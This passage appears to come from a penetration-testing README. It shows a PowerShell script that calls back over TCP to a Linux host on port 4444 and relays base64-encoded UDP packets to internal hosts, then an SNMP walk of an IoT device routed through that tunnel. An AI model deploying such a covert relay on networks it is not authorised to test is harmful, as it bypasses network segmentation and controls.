                  with open('/tmp/relay.rcv', "w") as rfifo:
                     rfifo.write(resp)
               except IOError as e:
                     sleep(0.1)
```

**Set up "Windows"**

Create and execute the `proxy.ps1` script.  This script is set to exit after 60 seconds of inactivity, you may want to raise that value.<br />
```powershell
$linhost = "192.168.1.242"
$linport = "4444"
$tidle = 0
$utmout = 1000
$packet = 1
try {
   $tclient = New-Object System.Net.Sockets.TcpClient($linhost, $linport)
} catch {
   write-host "Failed to connect to $linhost port $linport"
   exit
}
$strm = $tclient.GetStream()
$tbuf = New-Object Byte[] $tclient.ReceiveBufferSize
while($true) {
   if($tclient.Client.Available -gt 0) {
      $tidle = 0
      $trdata = $strm.Read($tbuf, 0, $tbuf.Length)
      $string = [System.Text.Encoding]::UTF8.GetString($tbuf[0..($trdata - 2)])
      $arr = $string -split ':'
      if($arr.Length -eq 3) {
         $udstip = $arr[0]
         $udstport = $arr[1]
         $ubytes = [Convert]::FromBase64String($arr[2])
         $uclient = new-object System.Net.sockets.udpclient(0)
         $uclient.Client.ReceiveTimeout = $utmout
         $ucount = $uclient.send($ubytes, $ubytes.Length, $udstip, $udstport)
         write-host "Packet "$packet", "$ucount" UDP bytes sent"
         $ipep = new-object System.Net.ipendpoint([System.Net.IPAddress]::any, 0)
         try {
            $urecv = $uclient.receive([ref]$ipep)
            write-host "Packet  $packet,"$urecv.Length"UDP bytes received"
            $urdata = [System.Convert]::ToBase64String($urecv)
            $urdata = "$urdata`n"
            $enc = [System.Text.Encoding]::UTF8
            $wbuf = $enc.GetBytes($urdata)
            $twdata = $strm.Write($wbuf, 0, $wbuf.Length)
         } catch {
            write-host "Packet "$packet", nothing received"
         }
         $packet++
         $uclient.close()
      }
   } else {
      Start-Sleep -Milliseconds 10
      $tidle++
      if($tidle -gt 6000) {
         # approx 60 seconds idle close
         write-host "TCP session timed out"
         $tclient.Close()
         break
      }
   }
}
```

**Set up "Linux 2"**

Configure a static route to the IOT target through "Linux 1".  Execute the snmpwalk command.<br />
```
ip route add 10.180.151.13/32 via 192.168.1.242
snmpwalk -v 2c -c public 10.180.151.13 .1.3.6.1.2.1.1.9.1.4
```

Output similar to the following whould appear.

"Linux 1"<br />
![alt text](https://github.com/billchaison/evasion/blob/master/udp01.png)<br />
![alt text](https://github.com/billchaison/evasion/blob/master/udp02.png)

"Linux 2"<br />
![alt text](https://github.com/billchaison/evasion/blob/master/udp03.png)<br />
![alt text](https://github.com/billchaison/evasion/blob/master/udp04.png)

"Windows"<br />
![alt text](https://github.com/billchaison/evasion/blob/master/udp05.png)
